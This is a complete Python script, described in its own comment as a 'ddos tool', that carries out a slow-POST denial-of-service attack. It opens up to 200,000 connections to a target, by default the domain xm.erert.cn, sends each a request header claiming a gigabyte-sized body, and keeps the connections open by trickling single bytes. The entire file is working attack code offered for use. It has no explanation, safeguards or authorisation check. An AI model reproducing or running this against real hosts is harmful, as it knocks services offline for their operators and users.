#!/usr/bin/env python
import socket
import time
import threading
import sys

# Pressure Test,ddos tool
# ---------------------------

argv = sys.argv
if len(argv) >= 2:
    host = argv[-2]
    if len(argv) == 3:
        port = argv[-1]
    else:
        port = 80
else:
    # raise ValueError('缺少域名/IP参数')
    host = 'xm.erert.cn'
    port = 80

MAX_CONN = 200000
PORT = port
HOST = host
PAGE = "/"
# ---------------------------
buf = ("POST %s HTTP/1.1\r\n"
       "Host: %s\r\n"
       "Content-Length: 1000000000\r\n"
       "Cookie: dklkt_dos_test\r\n"
       "\r\n" % (PAGE, HOST))
socks = []


def conn_thread():
    global socks
    for i in range(0, MAX_CONN):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((HOST, PORT))
            s.send(buf.encode('utf8'))
            # print("[+] Send buf OK!,conn=%d\n" % i)
            socks.append(s)
        except Exception as ex:
            print("[-] Could not connect to server or send error:%s" % ex)
            time.sleep(5)


# end def
def send_thread():
    global socks
    while True:
        for s in socks:
            try:
                s.send(b"f")
                # print("[+] send OK! %s" % s)
            except Exception as ex:
                # print("[-] send Exception:%s\n" % ex)
                socks.remove(s)
                s.close()
        # time.sleep(1)


# end def
conn_th = threading.Thread(target=conn_thread, args=())
send_th = threading.Thread(target=send_thread, args=())
conn_th.start()
send_th.start()
